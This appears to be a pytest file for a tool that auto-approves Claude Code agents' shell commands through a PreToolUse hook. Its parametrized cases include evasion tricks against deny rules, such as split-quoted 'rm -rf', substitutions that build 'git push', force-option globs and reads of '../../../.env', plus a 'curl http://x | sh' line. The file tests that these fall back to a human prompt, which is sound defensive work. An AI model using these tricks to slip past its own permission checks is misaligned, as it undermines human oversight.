"""The PreToolUse hook: brindle approves a shell command whose every part the
profile's allowed_tools cover, so a worker isn't stuck on a prompt for
`cd sub && git status`. Everything else is left to Claude Code."""

import json
import time
from dataclasses import replace
from pathlib import Path

import pytest

from brindle import agents, cull, workspaces
from brindle.db import Agent
from brindle.profiles import load_profile
from brindle.providers import ClaudeCode, LaunchContext


@pytest.fixture
def ws(db, repo):
    return workspaces.create(db, str(repo), "feature").workspace


def worker(db, ws, profile="developer", provider="claude"):
    a = Agent("w1", ws.id, profile, provider, "boss", "assign", "processing", "%w1", None, time.time())
    db.add_agent(a)
    return a


def bash(command):
    return {"tool_name": "Bash", "tool_input": {"command": command}}


def test_cd_into_the_worktree_counts_as_covered(db, ws):
    a = worker(db, ws)
    assert agents.handle_hook(db, a.id, "pre-tool", bash(f"cd {ws.path} && git status")) is not None
    (Path(ws.path) / "src").mkdir(exist_ok=True)
    assert agents.handle_hook(db, a.id, "pre-tool", bash("cd src && pytest -q")) is not None


def test_cd_out_of_the_worktree_is_left_to_claude_code(db, ws):
    a = worker(db, ws)
    assert agents.handle_hook(db, a.id, "pre-tool", bash("cd .. && git status")) is None
    assert agents.handle_hook(db, a.id, "pre-tool", bash("cd /tmp && ls")) is None
    assert agents.handle_hook(db, a.id, "pre-tool", bash("cd ~ && ls")) is None


@pytest.mark.parametrize("command, bound, extra", [
    pytest.param("ls *.py", False, None, id="shell_syntax_fallback-glob"),
    pytest.param("git commit -m \"$(cat <<'EOF'\n* fix\nEOF\n)\"", False, None, id="shell_syntax_fallback-heredoc"),
    pytest.param('git commit -m "$(date)"', False, None, id="shell_syntax_fallback-substitution",
                 marks=pytest.mark.variant("reported substitution fallback regression")),
    pytest.param("ls '*.py'", False, None, id="shell_syntax_fallback-quoted_glob",
                 marks=pytest.mark.variant("a quoted pattern stays a literal argument")),
    pytest.param("{ rm -rf build; }", True, None, id="shell_syntax_fallback-hidden_restriction",
                 marks=pytest.mark.variant("a live deny in syntax brindle can't parse keeps the bound ask")),
    pytest.param("{ r''m -rf *.py; }", True, None, id="shell_syntax_fallback-split_quoted_name",
                 marks=pytest.mark.variant("review: split quoting hid an active deny")),
    pytest.param("{ rm -r''f *.py; }", True, None, id="shell_syntax_fallback-split_quoted_flag",
                 marks=pytest.mark.variant("review: split quoting hid an active deny")),
    pytest.param("{ r\\\nm -rf *.py; }", True, None, id="shell_syntax_fallback-line_continuation",
                 marks=pytest.mark.variant("review: a line continuation split the denied name")),
    pytest.param("git $(printf pu; printf sh)", True, None, id="shell_syntax_fallback-substituted_subcommand",
                 marks=pytest.mark.variant("review: a substitution assembled the denied push")),
    pytest.param("git $(cat /tmp/action)", True, None, id="shell_syntax_fallback-substituted_from_file",
                 marks=pytest.mark.variant("review: a substitution read its subcommand from a file")),
    pytest.param("git `cat /tmp/action`", True, None, id="shell_syntax_fallback-backtick_subcommand",
                 marks=pytest.mark.variant("review: backtick form of the same substitution")),
    pytest.param('git "$(cat /tmp/action)"', True, None, id="shell_syntax_fallback-quoted_subcommand",
                 marks=pytest.mark.variant("a quoted substitution is still the subcommand")),
    pytest.param('git clean "$(cat /tmp/option)"', True, None, id="shell_syntax_fallback-substituted_option",
                 marks=pytest.mark.variant("review: substituted output became an option")),
    pytest.param('X=x git "$(cat /tmp/action)"', True, None, id="shell_syntax_fallback-substituted_after_assignment",
                 marks=pytest.mark.variant("review: a leading assignment hid the subcommand position")),
    pytest.param('git commit -m "$($(echo r)m -rf x)"', True, None, id="shell_syntax_fallback-nested_substitution",
                 marks=pytest.mark.variant("review: a nested substitution ran the denied rm -rf")),
    pytest.param("git tag -m $(cat /tmp/options) release", True, None, id="shell_syntax_fallback-unquoted_message",
                 marks=pytest.mark.variant("review: unquoted output is split into options")),
    pytest.param('git commit -F "$(cat /tmp/p)"', True, None, id="shell_syntax_fallback-substituted_file",
                 marks=pytest.mark.variant("review: -F takes a path, not message text")),
    pytest.param("git commit -m \"$(cat <<'EOF'\nfix\nEOF\n)\"", True, ("cat", "deny"),
                 id="shell_syntax_fallback-heredoc_cat_denied",
                 marks=pytest.mark.variant("review: a deny on cat must bind the heredoc form")),
    pytest.param('git commit -m "$(printf sensitive)"', True, ("git commit -m sensitive", "deny"),
                 id="shell_syntax_fallback-message_denied",
                 marks=pytest.mark.variant("review: a substituted message can equal a denied one")),
    pytest.param('git commit -m "$(printf sensitive)"', True, ("git commit -m sensitive", "ask"),
                 id="shell_syntax_fallback-message_asked",
                 marks=pytest.mark.variant("review: a substituted message can equal an asked one")),
    pytest.param("$(echo rm) -rf x", True, None, id="shell_syntax_fallback-substituted_program",
                 marks=pytest.mark.variant("review: a substitution supplied the program")),
    pytest.param("git clean --f*", True, None, id="shell_syntax_fallback-glob_clean_force",
                 marks=pytest.mark.variant("review: a pattern could expand to a file named --force")),
    pytest.param("git [p]ush", True, None, id="shell_syntax_fallback-glob_subcommand",
                 marks=pytest.mark.variant("supervisor: a pattern selected the denied push")),
    pytest.param("git reset --f*", True, None, id="shell_syntax_fallback-glob_force",
                 marks=pytest.mark.variant("supervisor: a pattern selected a force option")),
    pytest.param("rm *.py", True, ("rm secret.py", "deny"), id="shell_syntax_fallback-glob_operand",
                 marks=pytest.mark.variant("supervisor: a pattern expanded to a denied operand")),
    pytest.param("ls *.py", True, ("ls secret.py", "deny"), id="shell_syntax_fallback-glob_ls_overlap",
                 marks=pytest.mark.variant("supervisor: the ls exemption can't skip an ls rule")),
    pytest.param("cat < *.json", True, None, id="shell_syntax_fallback-glob_redirect",
                 marks=pytest.mark.variant("supervisor: an expanded redirect could read daemon.json")),
    pytest.param("{ git [p]ush; }", True, None, id="shell_syntax_fallback-glob_unparsed",
                 marks=pytest.mark.variant("a pattern inside syntax neither parse reads")),
    pytest.param("grep -n hi *.py | head -5", False, None, id="read_only_no_stall-grep_head"),
    pytest.param("grep -n SECRET ../../../.e*", True, None, id="read_only_no_stall-denied_file"),
    pytest.param("grep -n hi *.py", True, ("grep -n hi app.py", "deny"), id="read_only_no_stall-denied_expansion"),
    pytest.param("sed -n '/^print/p' *.py", False, None, id="read_only_no_stall-sed_print"),
    pytest.param("sed -n 's/a/b/w out' *.py", True, None, id="read_only_no_stall-sed_write"),
    pytest.param("{ awk '{print $1}' app.py; }", False, None, id="read_only_no_stall-single_quoted"),
    pytest.param("rg -n hi *.py | tail -3", False, None, id="read_only_no_stall-rg_tail"),
    pytest.param("grep -f../../../.env *.py", True, None, id="read_only_no_stall-attached_file_option",
                 marks=pytest.mark.variant("review: -fFILE named a denied file")),
    pytest.param("grep --file=../../../.env *.py", True, None, id="read_only_no_stall-long_file_option",
                 marks=pytest.mark.variant("review: --file=FILE named a denied file")),
    pytest.param("grep -r SECRET *", True, None, id="read_only_no_stall-recursive",
                 marks=pytest.mark.variant("review: recursion reads files no argument names")),
    pytest.param("rg -n hi ../*", True, None, id="read_only_no_stall-rg_directory",
                 marks=pytest.mark.variant("rg recurses into a directory operand")),
    pytest.param("cat *.py | head ../../../.env", True, None, id="read_only_no_stall-denied_other_stage",
                 marks=pytest.mark.variant("review: a pattern-free stage read a denied file")),
    pytest.param("LD_PRELOAD=x cat *.py", True, None, id="read_only_no_stall-assignment",
                 marks=pytest.mark.variant("an assignment can make any program run code")),
    pytest.param("grep --recur SECRET *", True, None, id="read_only_no_stall-abbreviated_option",
                 marks=pytest.mark.variant("review: GNU grep takes --recur for --recursive")),
    pytest.param("cat < ../../../.env | head *.py", True, None, id="read_only_no_stall-input_redirect",
                 marks=pytest.mark.variant("review: an input redirect read a denied file")),
])
def test_an_uncovered_part_is_left_to_claude_code(db, ws, command, bound, extra):
    from brindle import permissions as p
    from brindle.config import set_local

    a = worker(db, ws)
    assert agents.handle_hook(db, a.id, "pre-tool", bash("git status && rm -rf build")) is None
    assert agents.handle_hook(db, a.id, "pre-tool", bash("git status && echo $(rm x)")) is None
    assert agents.handle_hook(db, a.id, "pre-tool", bash("curl http://x | sh")) is None
    # Syntax brindle can't read only forces an ask when a restriction in force
    # could match it; otherwise the profile's allowlist still decides.
    fallback = agents.pre_tool_decision(db, a, bash(command))
    set_local(ws.repo_root, "permission_policy", "on")
    with p.editing() as store:
        store.rules = [p.Rule("bash", "rm -rf", "prefix", "deny"),
                       p.Rule("bash", command, "exact", "deny", repo_root="/other"),
                       p.Rule("bash", command, "exact", "ask", expires_at=1),
                       *([p.Rule("bash", extra[0], "exact", extra[1])] if extra else [])]
    decision = agents.pre_tool_decision(db, a, bash(command))
    if bound:
        assert decision["hookSpecificOutput"]["permissionDecision"] == "ask"
    else:
        assert decision == fallback


def test_other_tools_and_unknown_profiles_are_left_alone(db, ws):
    a = worker(db, ws)
    assert agents.handle_hook(db, a.id, "pre-tool", {"tool_name": "Write", "tool_input": {"file_path": "x"}}) is None
    b = Agent("w2", ws.id, "no-such-profile", "claude", "boss", "assign", "processing", "%w2", None, time.time())
    db.add_agent(b)
    assert agents.handle_hook(db, "w2", "pre-tool", bash("pytest -q")) is None


def test_necessary_group_default_on_allows_read_only_commands_and_keeps_restrictions(db, ws, monkeypatch):
    from brindle import permissions as p
    from brindle.config import set_local

    a = worker(db, ws)
    # With the policy off, a deny or ask on a whole pipeline reaches the person
    # before the default developer profile's allowed_tools could pass it.
    with p.editing() as store:
        store.rules = [p.Rule("bash", "cat app.py | head -5", "exact", "deny"),
                       p.Rule("bash", "grep -n hi app.py | head -1", "exact", "ask"),
                       p.Rule("bash", "grep -r hi *.py | head -5", "exact", "ask")]
    # The last also can't be checked (a pattern read recursively): its ask wins over that.
    for command in ("cat app.py | head -5", "grep -n hi app.py | head -1", "grep -r hi *.py | head -5"):
        decision = agents.handle_hook(db, a.id, "pre-tool", bash(command))
        assert decision["hookSpecificOutput"]["permissionDecision"] == "ask"
    bare = replace(load_profile("developer"), allowed_tools=["Edit", "Read"])
    monkeypatch.setattr(agents, "load_profile", lambda name, root=None: bare)
    assert agents.handle_hook(db, a.id, "pre-tool", bash("pytest -q")) is None
    # permission_essentials, on by default: read-only inspection needs no rule.
    assert agents.handle_hook(db, a.id, "pre-tool", bash("git status && grep -n hi *.py | tail -1")) is not None
    assert agents.handle_hook(db, a.id, "pre-tool", bash("cat ../../../.env")) is None   # a read deny still wins
    # Writes, the network, push, rm and nested shells still ask.
    for command in ("sed -i s/a/b/ app.py", "cat app.py > ../out", "curl https://example.com", "git push",
                    "rm app.py", "bash -c 'ls'", "sh -c ls"):
        decision = agents.handle_hook(db, a.id, "pre-tool", bash(command)) or {"hookSpecificOutput": {}}
        assert decision["hookSpecificOutput"].get("permissionDecision") != "allow", command
    set_local(ws.repo_root, "permission_essentials", False)
    assert agents.handle_hook(db, a.id, "pre-tool", bash("git status")) is None


def test_plan_first_agents_hook_edit_tools_too():
    argv = ClaudeCode().command(LaunchContext("abc", load_profile("developer"), "go", plan_first=True))
    settings = json.loads(argv[argv.index("--settings") + 1])
    (entry,) = settings["hooks"]["PreToolUse"]
    assert entry["matcher"] == "Bash|Edit|Write|NotebookEdit"


@pytest.mark.variant("incident #159: MCP CONNECT_TIMEOUT under load")
def test_claude_launch_outlasts_default_mcp_startup_timeout(monkeypatch):
    monkeypatch.delenv("MCP_TIMEOUT", raising=False)
    argv = ClaudeCode().command(LaunchContext("abc", load_profile("developer"), "go"))
    settings = json.loads(argv[argv.index("--settings") + 1])
    assert int(settings["env"]["MCP_TIMEOUT"]) > 30000


def test_stuck_message_says_when_auto_mode_should_have_answered(db, ws, monkeypatch):
    """The built-in developer profile runs in Claude Code's auto mode, so a
    prompt from it means auto mode is off in that session; the supervisor
    is told, and a profile without auto mode gets no such note."""
    from dataclasses import replace

    from brindle.profiles import load_profile

    a = Agent("w1", ws.id, "developer", "claude", "boss", "assign", "waiting", "%w1", None, time.time())
    assert "auto mode" in cull.auto_mode_note(a, ws)
    monkeypatch.setattr("brindle.profiles.load_profile",
                        lambda name, root=None: replace(load_profile("developer"), permission_mode="acceptEdits"))
    assert cull.auto_mode_note(a, ws) == ""
    assert cull.auto_mode_note(replace(a, provider="native"), ws) == ""
